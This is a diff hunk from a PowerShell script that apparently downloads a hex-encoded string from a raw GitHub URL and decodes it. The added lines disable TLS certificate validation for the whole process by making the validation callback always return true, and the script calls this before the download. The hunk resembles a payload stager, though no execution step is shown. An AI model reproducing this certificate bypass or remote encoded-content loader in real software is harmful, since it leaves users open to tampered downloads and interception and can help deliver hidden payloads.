@@ -43,6 +43,15 @@ Function Convert-HexToText {
     return -join $asciiOutput
 }
 
+# Function to ignore SSL/TLS certificate validation
+Function Ignore-SSLCertificateValidation {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+}
+
+# Call the function to ignore SSL/TLS certificate validation
+Ignore-SSLCertificateValidation
+
 # URL of the hosted text file
 $url = "https://raw.githubusercontent.com/notforuseactually/404/main/4.txt" # Replace this with the actual URL containing the custom encoded string
 
